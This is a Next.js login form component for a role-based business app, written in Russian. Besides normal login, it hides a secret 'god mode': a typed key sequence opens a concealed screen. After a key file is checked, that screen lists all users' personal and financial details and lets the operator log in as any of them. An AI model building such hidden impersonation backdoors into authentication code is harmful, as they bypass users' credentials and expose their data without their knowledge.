'use client'

import { useState, useRef, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { useForm } from 'react-hook-form'
import { zodResolver } from '@hookform/resolvers/zod'
import { z } from 'zod'
import Image from 'next/image'
import { useAuthStore } from '@/store/auth'
import FaceVerifyStep from './FaceVerifyStep'

const GOD_KEY_SEQUENCE = 'irwkcgod'

const ROLE_LABELS: Record<string, string> = {
  owner: 'Владелец',
  owner_assistant: 'Помощник владельца',
  partner: 'Партнёр',
  partner_controller: 'Контролёр',
  manager: 'Менеджер',
  promoter: 'Промоутер',
}

const loginSchema = z.object({
  email: z.string().email().optional(),
  promoter_id: z.number().optional(),
  password: z.string().min(6),
}).refine((data) => data.email || data.promoter_id, {
  message: "Either email or promoter_id is required",
})

type LoginFormData = z.infer<typeof loginSchema>

export default function LoginForm() {
  const [error, setError] = useState<string | null>(null)
  const router = useRouter()
  const { setAuth } = useAuthStore()
  const [inputValue, setInputValue] = useState('')
  const [rememberMe, setRememberMe] = useState(false)
  const [faceAuth, setFaceAuth] = useState<{ tempToken: string; user: any } | null>(null)
  const [godMode, setGodMode] = useState<'key' | 'menu' | null>(null)
  const [godSplash, setGodSplash] = useState(false)
  const [godToken, setGodToken] = useState<string | null>(null)
  const [godUsers, setGodUsers] = useState<{
    id: string; email: string; full_name: string; role: string; promoter_id: number | null;
    phone?: string; created_at?: string; is_active?: boolean; balance?: string; debt_to_company?: string; email_confirmed?: boolean;
  }[]>([])
  const [godHoveredIndex, setGodHoveredIndex] = useState<number | null>(null)
  const [godKeyError, setGodKeyError] = useState<string | null>(null)
  const [godKeyLoading, setGodKeyLoading] = useState(false)
  const [godMenuSelectedIndex, setGodMenuSelectedIndex] = useState(0)
  const godKeyBufRef = useRef('')

  const {
    register,
    handleSubmit,
    setValue,
    watch,
    formState: { errors, isSubmitting },
  } = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
  })

  // Автоматическое определение типа ввода (email или promoter_id)
  const handleInputChange = (value: string) => {
    setInputValue(value)
    
    // Если введены только цифры - это promoter_id
    if (/^\d+$/.test(value)) {
      setValue('promoter_id', parseInt(value, 10))
      setValue('email', undefined)
    } 
    // Если есть @ или это похоже на email - это email
    else if (value.includes('@') || /^[^\s@]+@[^\s@]+\.[^\s@]+/.test(value)) {
      setValue('email', value)
      setValue('promoter_id', undefined)
    }
    // Пока ввод не завершен - оставляем оба пустыми
    else {
      setValue('email', undefined)
      setValue('promoter_id', undefined)
    }
  }

  const onSubmit = async (data: LoginFormData) => {
    try {
      setError(null)
      
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      })

      const result = await response.json()

      if (!result.success) {
        setError(result.error || 'Login failed')
        return
      }

      if (result.requiresFaceAuth && result.data?.tempToken && result.data?.user) {
        setFaceAuth({ tempToken: result.data.tempToken, user: result.data.user })
        setError(null)
        return
      }

      if (!result.data?.token || !result.data?.user) {
        setError('Некорректный ответ сервера')
        return
      }

      setAuth(result.data.user, result.data.token, rememberMe)
      
      const role = result.data.user.role
      if (role === 'owner') {
        router.push('/dashboard/owner')
      } else if (role === 'owner_assistant') {
        router.push('/dashboard/owner-assistant')
      } else if (role === 'partner') {
        router.push('/dashboard/partner')
      } else if (role === 'partner_controller') {
        router.push('/dashboard/partner-controller')
      } else if (role === 'manager') {
        router.push('/dashboard/manager')
      } else if (role === 'promoter') {
        router.push('/dashboard/promoter')
      } else {
        router.push('/dashboard')
      }
    } catch (err) {
      setError('An error occurred. Please try again.')
      console.error('Login error:', err)
    }
  }

  const redirectByRole = (role: string) => {
    if (role === 'owner') router.push('/dashboard/owner')
    else if (role === 'owner_assistant') router.push('/dashboard/owner-assistant')
    else if (role === 'partner') router.push('/dashboard/partner')
    else if (role === 'partner_controller') router.push('/dashboard/partner-controller')
    else if (role === 'manager') router.push('/dashboard/manager')
    else if (role === 'promoter') router.push('/dashboard/promoter')
    else router.push('/dashboard')
  }

  const handleFaceSuccess = (token: string, user: any) => {
    setAuth(user, token, rememberMe)
    redirectByRole(user.role)
  }

  useEffect(() => {
    if (!godSplash) return
    const t = setTimeout(() => setGodSplash(false), 5000)
    return () => clearTimeout(t)
  }, [godSplash])

  useEffect(() => {
    if (godMode !== 'menu' || godSplash || godUsers.length === 0) return
    setGodMenuSelectedIndex(0)
  }, [godMode, godSplash, godUsers.length])

  useEffect(() => {
    if (godMode !== 'menu' || godSplash) return
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'ArrowDown') {
        e.preventDefault()
        setGodMenuSelectedIndex((i) => (i < godUsers.length - 1 ? i + 1 : i))
      } else if (e.key === 'ArrowUp') {
        e.preventDefault()
        setGodMenuSelectedIndex((i) => (i > 0 ? i - 1 : i))
      } else if (e.key === 'Enter') {
        e.preventDefault()
        const u = godUsers[godMenuSelectedIndex]
        if (u) handleGodImpersonate(u.id)
      }
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [godMode, godSplash, godUsers, godMenuSelectedIndex, handleGodImpersonate])

  useEffect(() => {
    if (faceAuth || godMode) return
    const onKey = (e: KeyboardEvent) => {
      const key = e.key?.length === 1 ? e.key : ''
      if (!key) return
      let buf = godKeyBufRef.current + key
      if (buf.length > GOD_KEY_SEQUENCE.length) buf = buf.slice(-GOD_KEY_SEQUENCE.length)
      godKeyBufRef.current = buf
      if (buf === GOD_KEY_SEQUENCE) {
        e.preventDefault()
        setGodMode('key')
        setGodKeyError(null)
        godKeyBufRef.current = ''
      }
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [faceAuth, godMode])

  const handleGodKeyFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    e.target.value = ''
    if (!file) return
    setGodKeyError(null)
    setGodKeyLoading(true)
    try {
      const text = await file.text()
      const secret = text.trim()
      const res = await fetch('/api/auth/god-key', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ secret }),
      })
      const data = await res.json()
      if (!data.success) {
        setGodKeyError(data.error || 'Неверный ключ')
        return
      }
      const token = data.godToken
      setGodToken(token)
      const usersRes = await fetch('/api/auth/god-mode/users', {
        headers: { Authorization: `Bearer ${token}` },
      })
      const usersData = await usersRes.json()
      if (!usersData.success || !Array.isArray(usersData.users)) {
        setGodKeyError('Не удалось загрузить список')
        return
      }
      setGodUsers(usersData.users)
      setGodMode('menu')
      setGodSplash(true)
    } catch (err) {
      setGodKeyError('Ошибка проверки ключа')
    } finally {
      setGodKeyLoading(false)
    }
  }

  const handleGodImpersonate = async (userId: string) => {
    if (!godToken) return
    try {
      const res = await fetch('/api/auth/god-mode/impersonate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${godToken}`,
        },
        body: JSON.stringify({ userId }),
      })
      const data = await res.json()
      if (!data.success || !data.data?.user || !data.data?.token) {
        setGodKeyError(data.error || 'Ошибка входа')
        return
      }
      setAuth(data.data.user, data.data.token, rememberMe)
      redirectByRole(data.data.user.role)
    } catch (err) {
      setGodKeyError('Ошибка входа')
    }
  }

  if (faceAuth) {
    return (
      <div className="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8 relative">
        <div className="max-w-md w-full space-y-8 relative z-10">
          <div className="glass-card">
            <div className="text-center mb-6">
              <Image src="/logo.png" alt="Logo" width={120} height={120} className="w-auto h-16 object-contain mx-auto" priority />
            </div>
            <FaceVerifyStep
              tempToken={faceAuth.tempToken}
              onSuccess={handleFaceSuccess}
              onCancel={() => setFaceAuth(null)}
            />
          </div>
        </div>
      </div>
    )
  }

  if (godMode) {
    return (
      <div className="fixed inset-0 z-50 bg-black flex flex-col font-mono text-white selection:bg-white selection:text-black">
        <style dangerouslySetInnerHTML={{ __html: `
          @keyframes god-flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.75; }
            25%, 75% { opacity: 0.9; }
          }
          .god-flicker { animation: god-flicker 0.12s ease-in-out infinite; }
        ` }} />
        {godSplash ? (
          <div className="absolute inset-0 flex flex-col items-center justify-center">
            <p className="god-flicker text-white text-2xl sm:text-4xl md:text-5xl font-medium tracking-widest text-center">
              Welcome master
            </p>
            <p className="god-flicker text-white text-xl sm:text-3xl md:text-4xl mt-4 tracking-[0.3em] text-center">
              irwkc
            </p>
          </div>
        ) : (
          <div className="flex-1 overflow-auto p-6 flex flex-col min-h-0">
            {godMode === 'key' && (
              <div className="flex flex-col items-center justify-center flex-1">
                <p className="text-white/80 text-sm mb-2">$</p>
                <label className="cursor-pointer text-white hover:text-white/90 transition-colors">
                  <input
                    type="file"
                    accept=".txt,.key,text/*"
                    className="sr-only"
                    onChange={handleGodKeyFile}
                    disabled={godKeyLoading}
                  />
                  {godKeyLoading ? '> verifying...' : '> open'}
                </label>
                {godKeyError && (
                  <p className="mt-4 text-red-500 text-sm">err: {godKeyError}</p>
                )}
              </div>
            )}
            {godMode === 'menu' && !godSplash && (
              <div className="flex gap-8 w-full max-w-4xl">
                <div className="flex-shrink-0">
                  <p className="text-white/80 text-sm mb-4">$ access --list</p>
                  <p className="text-white/60 text-xs mb-4">select account [id] — arrows + Enter</p>
                  <ul className="space-y-1 min-w-[280px]">
                    {godUsers.map((u, i) => (
                      <li key={u.id}>
                        <button
                          type="button"
                          onClick={() => handleGodImpersonate(u.id)}
                          onMouseEnter={() => setGodHoveredIndex(i)}
                          onMouseLeave={() => setGodHoveredIndex(null)}
                          className={`w-full text-left py-2 px-2 font-mono text-sm border-l-2 transition-colors ${
                            i === godMenuSelectedIndex
                              ? 'bg-white/15 text-white border-white'
                              : 'text-white/80 hover:bg-white/5 border-transparent hover:border-white/50'
                          }`}
                        >
                          <span className="text-white/70">[{i}]</span>{' '}
                          {u.full_name || u.email || `id:${u.promoter_id ?? u.id.slice(0, 8)}`}{' '}
                          <span className="text-white/50">({ROLE_LABELS[u.role] || u.role})</span>
                        </button>
                      </li>
                    ))}
                  </ul>
                  {godKeyError && (
                    <p className="mt-4 text-red-500 text-sm">err: {godKeyError}</p>
                  )}
                </div>
                <div className="flex-1 min-w-0 border-l border-white/20 pl-6">
                  {(godHoveredIndex !== null || godMenuSelectedIndex >= 0) && (() => {
                    const u = godUsers[godHoveredIndex ?? godMenuSelectedIndex]
                    if (!u) return null
                    return (
                      <div className="font-mono text-white/90 text-xs space-y-2">
                        <p><span className="text-white/50">id:</span> {u.id}</p>
                        <p><span className="text-white/50">role:</span> {u.role}</p>
                        {u.email && <p><span className="text-white/50">email:</span> {u.email}</p>}
                        {u.full_name && <p><span className="text-white/50">name:</span> {u.full_name}</p>}
                        {u.phone && <p><span className="text-white/50">phone:</span> {u.phone}</p>}
                        {u.promoter_id != null && <p><span className="text-white/50">promoter_id:</span> {u.promoter_id}</p>}
                        {u.created_at != null && <p><span className="text-white/50">created:</span> {new Date(u.created_at).toLocaleString()}</p>}
                        {u.balance != null && <p><span className="text-white/50">balance:</span> {u.balance}</p>}
                        {u.debt_to_company != null && <p><span className="text-white/50">debt_to_company:</span> {u.debt_to_company}</p>}
                        {u.email_confirmed != null && <p><span className="text-white/50">email_confirmed:</span> {u.email_confirmed ? 'yes' : 'no'}</p>}
                        {u.is_active != null && <p><span className="text-white/50">active:</span> {u.is_active ? 'yes' : 'no'}</p>}
                      </div>
                    )
                  })()}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    )
  }

  return (
    <div className="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8 relative">
      <div className="max-w-md w-full space-y-8 relative z-10">
        <div className="glass-card">
          <div className="text-center mb-8">
            <div className="flex justify-center mb-6">
              <Image
                src="/logo.png"
                alt="Logo"
                width={200}
                height={200}
                className="w-auto h-24 object-contain"
                priority
              />
            </div>
          </div>
          
          <form className="space-y-6" onSubmit={handleSubmit(onSubmit)}>
            <div className="space-y-4">
              <div>
                <label htmlFor="login" className="block text-sm font-medium text-white/90 mb-2">
                  Email или ID промоутера
                </label>
                <input
                  id="login"
                  type="text"
                  value={inputValue}
                  onChange={(e) => handleInputChange(e.target.value)}
                  className="input-glass"
                  placeholder="email@example.com или 12345"
                  autoComplete="username"
                />
                <input type="hidden" {...register('email')} />
                <input type="hidden" {...register('promoter_id', { valueAsNumber: true })} />
                {(errors.email || errors.promoter_id) && (
                  <p className="text-red-300 text-xs mt-1.5">
                    {errors.email?.message || errors.promoter_id?.message || 'Введите email или ID промоутера'}
                  </p>
                )}
              </div>

              <div>
                <label htmlFor="password" className="block text-sm font-medium text-white/90 mb-2">
                  Пароль
                </label>
                <input
                  {...register('password')}
                  id="password"
                  type="password"
                  autoComplete="current-password"
                  className="input-glass"
                  placeholder="••••••••"
                />
                {errors.password && (
                  <p className="text-red-300 text-xs mt-1.5">{errors.password.message}</p>
                )}
              </div>

              <div className="flex items-center">
                <input
                  id="remember-me"
                  name="remember-me"
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="h-4 w-4 rounded border-white/30 bg-white/10 text-purple-600 focus:ring-purple-500 focus:ring-offset-purple-200"
                />
                <label htmlFor="remember-me" className="ml-2 block text-sm text-white/90">
                  Запомнить вход на данном устройстве
                </label>
              </div>
            </div>

            {error && (
              <div className="alert-error">
                <p className="text-sm font-medium">{error}</p>
              </div>
            )}

            <div>
              <button
                type="submit"
                disabled={isSubmitting}
                className="btn-primary w-full"
              >
                {isSubmitting ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Вход...
                  </span>
                ) : (
                  'Войти'
                )}
              </button>
            </div>

            <div className="text-center">
              <a
                href="/auth/forgot-password"
                className="text-sm font-medium text-white/80 hover:text-white transition-colors"
              >
                Забыли пароль?
              </a>
            </div>
          </form>
        </div>
      </div>
    </div>
  )
}